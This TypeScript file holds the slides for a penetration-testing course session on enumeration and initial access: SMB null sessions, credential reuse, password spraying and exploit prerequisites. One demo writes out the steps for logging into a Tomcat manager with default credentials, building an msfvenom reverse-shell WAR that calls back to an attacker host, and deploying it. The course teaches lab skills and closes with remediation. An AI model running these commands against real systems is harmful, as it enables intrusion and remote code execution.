import type { Session } from '../types';

export const s2: Session = {
  id: 's2', number: 2, week: 1, kind: 'theory', day: 'Tuesday',
  dateISO: '2026-11-17', dateLabel: '17 Nov', durationHours: 3,
  topic: 'From an exposed service to initial access',
  title: 'Enumeration & Initial Access',
  outcome: 'Select a plausible entry point and explain its prerequisites and success indicators.',
  summary: 'Service-specific enumeration, authentication testing, exploit selection, and getting a shell.',
  stages: ['access'], domains: ['access', 'exploit'],
  sources: [
    { label: 'Primary eCPPT repository', url: 'https://github.com/Dragkob/eCPPT' },
    { label: 'INE eCPPT objectives', url: 'https://ine.com/security/certifications/ecppt-certification' },
  ],
  reading: [{ label: 'Network & service enumeration notes (eJPT)', url: 'https://github.com/Dragkob/eJPT' }],
  independentStudy: 'Take two services from today (say SMB and HTTP) and write, from memory, the five enumeration steps you would run against each and what each step would tell you.',
  slides: [
    {
      id: 's2-title', kind: 'title', tag: 'WEEK 1 · SESSION 02 · THEORY',
      title: 'From an exposed service to initial access',
      subtitle: 'Enumeration, authentication testing, and the first shell',
      lead: 'A port is an invitation to a conversation. Enumeration is learning to speak each protocol well enough to be let in.',
      blocks: [
        { type: 'figure', title: 'SESSION BRIEF', rows: [
          { k: 'OUTCOME', v: 'Select a plausible entry point and explain its prerequisites and success indicators.', tone: 'evidence' },
          { k: 'STAGE', v: 'Initial Access — stage 02 of the attack chain', tone: 'attacker' },
          { k: 'BUILDS ON', v: 'Session 01 — the host-and-service matrix you produced is today\'s input.' },
          { k: 'EXIT CHECK', v: 'A chosen entry point, supporting evidence, and a plan to confirm success.', tone: 'valid' },
        ] },
      ],
      notes: 'Connect to last session: enumeration is what turns yesterday\'s inventory into today\'s foothold. We go deep on individual services.',
    },
    {
      id: 's2-scenario', kind: 'scenario', tag: 'SCENARIO',
      title: 'Two open ports, one window',
      lead: 'Your matrix shows SMB on 445 and a Tomcat manager on 8080. Where do you spend the next hour?',
      blocks: [
        { type: 'prose', md: 'Both are plausible. SMB might leak users and shares; Tomcat might accept a deployed web-shell. You cannot brute-force both for an hour each — you have to choose, act, and record why.' },
        { type: 'callout', tone: 'caution', title: 'The enumeration trap', md: 'Novices either stop enumerating too early (and attack blind) or never stop (and never attack). The skill is knowing when you have *enough* evidence to commit to a path — and keeping a fallback ready.' },
      ],
      notes: 'Set up the whole session as a decision between two real paths. We will enumerate both, then choose.',
    },
    {
      id: 's2-objectives', kind: 'objectives', tag: 'OBJECTIVES',
      title: 'What you will be able to do',
      blocks: [
        { type: 'list', style: 'check', items: [
          'Run service-specific enumeration for SMB, SSH, FTP, HTTP, and remote-admin services.',
          'Discover usernames, shares, and configuration weaknesses, and reason about credential reuse.',
          'Choose between password spraying and brute force, and respect account lockout.',
          'Match a product + version + configuration to an exploit and its prerequisites.',
          'Interpret a shell: its type, the account context, and why a connection failed.',
        ] },
      ],
    },
    {
      id: 's2-services', kind: 'concept', tag: 'CONCEPT · 01',
      title: 'Each service speaks its own language',
      lead: 'Generic scanning finds the door; service-specific enumeration reads what is written on it.',
      blocks: [
        { type: 'table', head: ['Service', 'Port', 'What to ask it', 'Common foothold'], rows: [
          ['SMB', '445', 'Shares, users, null sessions, signing', 'Readable share with credentials/config'],
          ['SSH', '22', 'Version, auth methods, valid users', 'Reused or weak credentials'],
          ['FTP', '21', 'Anonymous login, writable dirs', 'Anonymous upload to a web root'],
          ['HTTP(S)', '80/443/8080', 'Tech, paths, admin panels, versions', 'Admin upload / known CVE'],
          ['RDP/WinRM', '3389/5985', 'NLA, valid users, cred reuse', 'Valid domain credential'],
        ] },
        { type: 'callout', tone: 'evidence', md: 'Every row is a set of *questions*, not a tool. The tool is just how you ask. Knowing the question is what separates enumeration from scanning.' },
      ],
      notes: 'Discourage tool-first thinking. The question comes first; the tool is interchangeable.',
    },
    {
      id: 's2-smb', kind: 'demo', tag: 'DEMONSTRATE · 02',
      title: 'Enumerating SMB',
      lead: 'SMB is talkative. Ask it who the users are and what it will let you read.',
      blocks: [
        { type: 'terminal', title: 'SMB enumeration', lines: [
          { text: 'smbclient -L //10.10.24.15/ -N', kind: 'cmd' },
          { text: 'Sharename       Type      Comment', kind: 'out' },
          { text: 'backups         Disk      Nightly backups', kind: 'out', tone: 'caution' },
          { text: 'IPC$            IPC       Remote IPC', kind: 'out' },
          { text: 'enum4linux-ng -A 10.10.24.15', kind: 'cmd' },
          { text: '[+] Found domain user: j.mills', kind: 'out', tone: 'caution' },
          { text: '[+] Found domain user: a.rowe', kind: 'out', tone: 'caution' },
        ] },
        { type: 'callout', tone: 'caution', title: 'What just happened', md: 'A **null session** (`-N`, no credentials) listed shares and users. The `backups` share and two usernames are leads — not yet access. The next question: can you read `backups` without credentials?' },
      ],
      study: [
        { type: 'prose', md: 'Not every SMB server allows null sessions — modern Windows restricts them. When they are allowed, they are a goldmine: user lists feed password spraying, and readable shares frequently hold configuration files, scripts, or backups containing credentials. Always note *signing* status too: if SMB signing is not required, relay attacks (covered in Week 5) become possible.' },
      ],
      notes: 'Draw the line between a lead (a username) and access (reading a share). Keep reinforcing observation vs finding.',
    },
    {
      id: 's2-creds', kind: 'concept', tag: 'CONCEPT · 03',
      title: 'Usernames, shares, and the credential you already have',
      lead: 'The most reliable "exploit" is a password that works somewhere it should not.',
      blocks: [
        { type: 'steps', items: [
          { label: 'Harvest usernames', text: 'From SMB, web pages, email formats, and metadata. Build a list.', tone: 'evidence' },
          { label: 'Find any credential', text: 'In a readable share, a config file, a default, or a prior finding.', tone: 'caution' },
          { label: 'Test for reuse', text: 'A credential that works on one service is worth trying on every service.', tone: 'attacker' },
        ] },
        { type: 'callout', tone: 'attacker', title: 'Credential reuse is the quiet killer', md: 'An admin who reuses one password across SSH, SMB, and a web panel turns a single leak into total access. When you find one credential, your next question is always: *where else does this work?*' },
      ],
      notes: 'Reuse is the single highest-yield idea in the course after observation-vs-finding. Hammer it.',
    },
    {
      id: 's2-auth', kind: 'concept', tag: 'CONCEPT · 04',
      title: 'Spraying vs brute force — and lockout',
      lead: 'How you test credentials can get you locked out or detected before you get in.',
      blocks: [
        { type: 'compare', columns: [
          { title: 'Password spraying', tone: 'valid', sub: 'safer', items: ['One/few passwords across MANY users', 'Stays under per-account lockout thresholds', 'Mirrors how real weak passwords cluster', 'Preferred when a lockout policy exists'] },
          { title: 'Brute force', tone: 'attacker', sub: 'risky', items: ['MANY passwords against ONE user', 'Trips account lockout quickly', 'Noisy; often detected or throttled', 'Only when lockout is known to be absent'] },
        ] },
        { type: 'callout', tone: 'caution', title: 'Check the policy first', md: 'Before testing any credential at scale, establish the lockout policy. Locking out a real user account is a disruption you must avoid — and it ends your quiet access.' },
      ],
      notes: 'Tie to professionalism: locking out staff accounts is a real-world incident. Spraying respects the policy.',
    },
    {
      id: 's2-research', kind: 'concept', tag: 'CONCEPT · 05',
      title: 'Vulnerability research: matching the lock to the key',
      lead: 'A version is a lead. An exploit has prerequisites. Confirm the match before you fire.',
      blocks: [
        { type: 'steps', items: [
          { label: 'Pin the exact product + version', text: 'Tomcat 9.0.30, not "Tomcat". Precision decides which exploits apply.', tone: 'evidence' },
          { label: 'Read the exploit\'s prerequisites', text: 'Does it need auth? A specific config? A reachable endpoint? A writable path?', tone: 'caution' },
          { label: 'Define success in advance', text: 'State what a working exploit would prove — code execution, a file read, a crash.', tone: 'valid' },
        ] },
        { type: 'callout', tone: 'evidence', md: 'Most "the exploit didn\'t work" failures are unmet prerequisites, not broken code. Reading the requirements first saves the hour you would spend debugging the wrong thing.' },
      ],
      notes: 'Pre-empt next week: this discipline is exactly what Session 8 formalises for exploit development.',
    },
    {
      id: 's2-select', kind: 'evidence', tag: 'WORKED EXAMPLE · 06',
      title: 'Choosing the Tomcat path',
      lead: 'The evidence points one way. Here is the decision, made explicit.',
      blocks: [
        { type: 'figure', title: 'DECISION RECORD', rows: [
          { k: 'CANDIDATE', v: 'Tomcat 9.0.30 manager on 8080', tone: 'evidence' },
          { k: 'EVIDENCE', v: 'Version banner + /manager/html reachable + weak default creds likely', tone: 'evidence' },
          { k: 'PREREQ', v: 'Manager auth (default/weak creds) and deploy permission', tone: 'caution' },
          { k: 'SUCCESS = ', v: 'Deploy a test .war and execute a command → code execution', tone: 'valid' },
          { k: 'FALLBACK', v: 'If manager is locked, pivot to reading the SMB backups share', tone: 'caution' },
        ] },
      ],
      notes: 'This is the exit-check made concrete: entry point + evidence + success plan + fallback.',
    },
    {
      id: 's2-tomcat', kind: 'demo', tag: 'DEMONSTRATE · 07',
      title: 'Landing the foothold',
      lead: 'Authenticate to the manager, deploy a payload, catch the shell.',
      blocks: [
        { type: 'terminal', title: 'Tomcat manager → web shell', lines: [
          { text: 'curl -u tomcat:tomcat http://10.10.24.15:8080/manager/text/list', kind: 'cmd' },
          { text: 'OK - Listed applications', kind: 'out', tone: 'valid' },
          { text: '# default credentials accepted — this is the prerequisite met', kind: 'comment' },
          { text: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.24.5 LPORT=4444 -f war -o shell.war', kind: 'cmd' },
          { text: 'curl -u tomcat:tomcat -T shell.war "http://10.10.24.15:8080/manager/text/deploy?path=/shell"', kind: 'cmd' },
          { text: 'OK - Deployed application at context path [/shell]', kind: 'out', tone: 'valid' },
        ] },
        { type: 'callout', tone: 'valid', title: 'The prerequisite chain, visible', md: 'Default creds (prereq 1) → deploy permission (prereq 2) → reachable context (prereq 3). Each link is evidence. Triggering `/shell` now connects back to your listener.' },
      ],
      notes: 'Narrate each prerequisite as it is satisfied. This is the chain-of-evidence habit applied to exploitation.',
    },
    {
      id: 's2-shells', kind: 'concept', tag: 'CONCEPT · 08',
      title: 'Shells, sessions, and context',
      lead: 'You have a shell. What kind, as whom, and how stable?',
      blocks: [
        { type: 'diagram', kind: 'shell', caption: 'Bind vs reverse vs interactive — pick based on firewalls and what you need to do.' },
        { type: 'terminal', title: 'Establish context immediately', lines: [
          { text: 'id', kind: 'cmd' },
          { text: 'uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)', kind: 'out', tone: 'caution' },
          { text: 'hostname; uname -a', kind: 'cmd' },
          { text: 'WEB01 Linux 5.4.0 x86_64', kind: 'out' },
        ] },
        { type: 'callout', tone: 'evidence', md: 'First three commands on any shell: **who am I** (`id`), **where am I** (`hostname`), **what is this** (`uname`). You are `tomcat`, not root — which is exactly the setup for next week\'s privilege escalation.' },
      ],
      notes: 'Introduce bind/reverse/interactive briefly; the lab will make it concrete. Context-first is a discipline.',
    },
    {
      id: 's2-metasploit', kind: 'concept', tag: 'TOOLING · 09',
      title: 'Metasploit, used deliberately',
      lead: 'A framework that speeds you up only once you know what it is doing.',
      blocks: [
        { type: 'list', items: [
          { text: '**Modules** pair an exploit with its options — the same prerequisites you would check by hand.' },
          { text: '**`check`** validates applicability without firing. Use it; it embodies observation-before-exploitation.' },
          { text: '**Sessions** manage your shells; `sessions -i` interacts, `background` returns to the console.' },
          { text: '**Payloads** must match (reverse vs bind, staged vs stageless, correct arch).' },
        ] },
        { type: 'callout', tone: 'caution', title: 'Automation hides prerequisites', md: 'Metasploit will happily run an exploit whose prerequisites are unmet and report failure with no explanation. Knowing the manual steps is what lets you debug it.' },
      ],
      notes: 'Position Metasploit as an accelerator, never a substitute for understanding. The check command is a teaching ally.',
    },
    {
      id: 's2-compare', kind: 'compare', tag: 'ANALYSIS · 10',
      title: 'Two hosts, same scan, different path',
      lead: 'Identical nmap output does not mean identical exploitation.',
      blocks: [
        { type: 'compare', columns: [
          { title: 'WEB01 (.15)', tone: 'attacker', items: ['Tomcat manager reachable', 'Default creds accepted', 'Deploy permission present', '→ Direct code execution'] },
          { title: 'APP02 (.22)', tone: 'caution', items: ['Tomcat manager reachable', 'Strong, unknown creds', 'Manager IP-restricted', '→ No path here; enumerate elsewhere'] },
        ] },
        { type: 'callout', tone: 'evidence', md: 'Same service, same version — but the *configuration* decides exploitability. This is why you validate prerequisites per host instead of trusting the banner.' },
      ],
      notes: 'Reinforce: the banner is identical, the outcome is not. Configuration is the deciding evidence.',
    },
    {
      id: 's2-mistakes', kind: 'mistakes', tag: 'COMMON MISTAKES',
      title: 'How initial access goes wrong',
      blocks: [
        { type: 'list', style: 'cross', items: [
          { text: 'Brute-forcing a user into lockout instead of spraying a few passwords across many.', tone: 'attacker' },
          { text: 'Firing an exploit without reading its prerequisites, then blaming the exploit.', tone: 'attacker' },
          { text: 'Getting a shell and immediately escalating — before running `id` to learn who you are.', tone: 'attacker' },
          { text: 'Choosing a bind shell behind an inbound firewall, then wondering why it never connects.', tone: 'attacker' },
          { text: 'Not recording the working credential — and losing access when the shell dies.', tone: 'attacker' },
        ] },
      ],
      notes: 'Each mistake maps to a concept taught today. Call the mapping out.',
    },
    {
      id: 's2-reasoning', kind: 'concept', tag: 'THE METHOD',
      title: 'Five questions for your chosen entry point',
      blocks: [
        { type: 'reasoning',
          evidence: 'The Tomcat manager is reachable and accepts default credentials, and the deploy endpoint responds — three satisfied prerequisites.',
          conditions: 'Manager auth must succeed, deploy permission must be granted, and the deployed context must be reachable to trigger the payload.',
          proves: 'A successful deploy-and-trigger proves remote code execution as the Tomcat service account — not merely that a login page exists.',
          next: 'With a shell as a low-privilege service account, the next investigation is local privilege escalation on WEB01.',
          rootcause: 'Remove default credentials, restrict the manager interface, and run the service with least privilege.',
        },
      ],
      notes: 'Model the five questions on the real decision from today. This rhythm should now feel familiar.',
    },
    {
      id: 's2-check', kind: 'check', tag: 'KNOWLEDGE CHECK',
      title: 'Check your understanding',
      blocks: [
        { type: 'check',
          q: 'You have one valid credential for the user j.mills on SSH. What is the highest-value next action?',
          options: [
            { text: 'Immediately brute-force the root account over SSH.' },
            { text: 'Test that credential against every other service and host — credential reuse.', correct: true },
            { text: 'Stop; one credential is not useful on its own.' },
            { text: 'Report it as full compromise.' },
          ],
          answer: 'Test it **everywhere**. A credential that works on SSH frequently works on SMB, RDP, a web panel, or another host. Credential reuse turns a single foothold into lateral reach, and it is cheap to check before you invest in anything noisier.',
        },
      ],
      notes: 'If anyone picks brute-force root, revisit lockout and reuse together.',
    },
    {
      id: 's2-recap', kind: 'recap', tag: 'RECAP & STUDY',
      title: 'What to carry into the lab',
      blocks: [
        { type: 'list', style: 'check', items: [
          'Enumeration is a set of questions per service, not a single tool.',
          'A username or share is a lead; access is reading or executing something.',
          'Spray, don\'t brute-force, when a lockout policy may exist.',
          'Exploits fail on unmet prerequisites — read them, then define success.',
          'First on any shell: id, hostname, uname. Know who and where you are.',
        ] },
        { type: 'callout', tone: 'evidence', title: 'Independent study', md: 'For SMB and HTTP, write the five enumeration steps you would run against each, and what each step would tell you. Bring it to the lab.' },
      ],
      notes: 'Next is the Week 1 lab: discover, enumerate, and land a foothold on a live subnet — the first two stages end to end.',
    },
  ],
};
